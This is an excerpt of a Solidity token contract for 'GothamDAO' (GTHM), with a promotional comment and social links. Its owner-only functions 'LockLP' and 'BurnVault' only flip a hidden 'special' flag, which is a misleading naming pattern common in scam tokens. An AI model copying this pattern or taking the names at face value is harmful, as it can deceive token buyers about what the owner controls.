...
//GothamDAO is the first Olympus Dao fork with a treasury backed by real estate.

/*
  https://t.me/GothamDAO

  https://gothamdao.com/
  https://twitter.com/GothamDao
  https://discord.com/invite/u8EzuJ8VBq
  https://medium.com/@gothamdao
*/
...
contract dAPPRewards is Ownable {
  ...
  function LockLP() onlyOwner ifdAPPRewardsOff public {
    special = true;
    emit dAPPRewardsOn();
  }

  function BurnVault() onlyOwner ifdAPPRewardsOn public {
    special = false;
    emit dAPPRewardsOff();
  }
}
...
contract GothamDAO is Context, IERC20, Ownable, dAPPRewards {
    ...
    string private _name = "GothamDAO";
    string private _symbol = "GTHM";
